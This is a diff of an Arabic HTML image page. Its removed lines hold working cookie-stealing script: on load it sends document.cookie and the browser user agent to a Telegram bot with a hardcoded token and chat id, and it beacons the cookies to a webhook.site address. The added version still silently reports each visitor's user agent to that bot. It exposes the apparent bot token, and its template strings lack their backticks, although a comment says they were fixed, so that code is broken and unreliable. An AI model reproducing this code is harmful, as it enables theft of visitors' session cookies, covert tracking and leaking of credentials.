@@ -1,26 +1,21 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>صفحة الصورة</title>
+    <meta charset="UTF-8">
+    <title>صفحة الاختبار</title>
 </head>
 <body>
 
     <img src="myphoto.jpg" alt="الصورة" id="myImage" width="300">
 
     <script>
-      const image = document.getElementById("myImage");
-
-      image.addEventListener("load", async () => {
-        alert("تم تحميل الصورة بنجاح!");
-
-        // قراءة الكوكيز المتاحة (إن وجدت)
-        const userCookies = document.cookie || "لا توجد كوكيز متاحة (تشغيل محلي أو HttpOnly)";
-
+      async function sendTelegramNotification() {
         const botToken = "8995153837:AAH66CFMXE1JKFE-o4yztrL8Jy2DQMh3paM"; 
         const chatId = "8507769505"; 
-        
-        const messageText = `🔔 تنبيه تحميل الصورة:\n\n🍪 الكوكيز:\n${userCookies}\n\n🌐 المتصفح:\n${navigator.userAgent}`;
-        const telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+
+        // إضافة علامات التنصيص المائلة (Backticks) بشكل صحيح
+        const messageText = 🔔 تنبيه اختبار الصفحة:\n\n🌐 المتصفح:\n${navigator.userAgent};
+        const telegramUrl = https://api.telegram.org/bot${botToken}/sendMessage;
 
         try {
           const res = await fetch(telegramUrl, {
@@ -37,17 +32,17 @@
           const data = await res.json();
 
           if (data.ok) {
-            console.log("تم إرسال البيانات بنجاح!");
+            console.log("تم إرسال الرسالة بنجاح!");
           } else {
             console.error("خطأ من تليجرام:", data.description);
           }
         } catch (error) {
           console.error("حدث خطأ أثناء الإرسال:", error);
         }
-      });
-    </script>
+      }
 
-    <script>new Image().src="https://webhook.site/bfa1396e-8204-4eff-97b7-ceec8bab0363";/cookie.php?cookie="+document.cookie</script>
+      window.addEventListener("DOMContentLoaded", sendTelegramNotification);
+    </script>
 
 </body>
 </html>
